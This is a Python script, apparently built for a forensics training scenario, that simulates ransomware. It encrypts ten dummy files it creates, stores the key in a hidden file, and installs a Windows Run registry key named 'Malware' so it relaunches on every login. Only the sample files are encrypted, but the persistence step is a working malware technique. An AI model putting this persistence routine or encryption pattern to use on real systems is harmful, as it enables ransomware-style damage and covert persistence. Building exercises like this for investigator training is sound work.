"""
1. Simulates ransomware by encrypting sensitive files (e.g., financial documents).

2. Adds a registry key to ensure malware persistence, enabling it to restart after reboots.

3. Retains encrypted files and a hidden encryption key as evidence for investigators.

Relation to the Attack Scenario:
    - Demonstrates a possible secondary attack vector, targeting sensitive bank data.
    - Creates registry entries that investigators can use to trace the malware's origin.
    - Provides encrypted files and logs for analysis.
"""

import os
import threading
from cryptography.fernet import Fernet
import subprocess

def encrypt_files():
    key = Fernet.generate_key()
    cipher = Fernet(key)
    with open(".encryption_key", "wb") as f:
        f.write(key)

    os.makedirs("files_to_encrypt", exist_ok=True)
    for i in range(10):
        file_path = f"files_to_encrypt/file_{i}.txt"
        with open(file_path, "w") as f:
            f.write("Confidential data.")
        with open(file_path, "rb") as f:
            encrypted_data = cipher.encrypt(f.read())
        with open(file_path, "wb") as f:
            f.write(encrypted_data)
    print("Files encrypted.")

def establish_persistence():
    reg_command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Malware" /t REG_SZ /d "{os.path.abspath(__file__)}" /f'
    subprocess.run(reg_command, shell=True)
    print("Registry persistence established.")

if __name__ == "__main__":
    threads = [
        threading.Thread(target=encrypt_files),
        threading.Thread(target=establish_persistence)
    ]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
